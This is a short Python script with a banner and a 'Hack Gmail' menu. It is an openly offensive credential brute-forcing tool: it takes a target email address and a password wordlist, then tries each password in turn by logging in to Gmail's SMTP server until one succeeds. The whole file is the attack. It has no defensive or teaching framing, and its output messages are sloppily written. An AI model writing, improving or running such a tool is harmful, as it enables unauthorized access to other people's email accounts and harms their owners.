import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print(" \033[01;33m ____    __  __   ___      ___    __ __  __  __                                       ")
print(" \033[01;33m/   __\ |  \| | /  _  \  /  _  \ |  o  \|  \|  |")
print(" \033[01;33m\__   \ |     ||  (_)  ||  (_)  ||   __/ \__   |")
print(" \033[01;33m\_____/ |_|\__| \_____/  \_____/ |__|   <______/ ")
print("\033[01;34m                  By Matrix karimo Slimani .============>>")
print("                                                         ")
print("\033[01;32m[01] \033[01;34mHack Gmail")
number = input("\033[01;32mTybe Your Number Please .... :")
if number ==("1"):
    print ("\033[01;33m======> willcom <======")
else:
    print("\033[01;33m===> Error The Number <===")
    print("\033[01;33m[*] \033[01;34mTybe Number '1' Please ....!")
    Number= input("\033[01;34m[+] \033[01;33mTybe The Namber :")
    if Number ==("1"):
        print("\033[01;33m .... \033[01;34mWillcom To My Programmer \033[01;33m 0....")
    else:
        print("Error")

user = input("\033[01;33m[+] Email That you want to hack ===> :")
passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
passwfile = open(passwfile, "r")

for password in passwfile:
    try:
        smtpserver.login(user, password)
        print("\033[01;34m[+]password fond \033[01;33m==>  ")
        break;

    except smtplib.SMTPAuthenticationError:
        print("\033[01;33m[!]password not fond \033[01;34m===>   ")
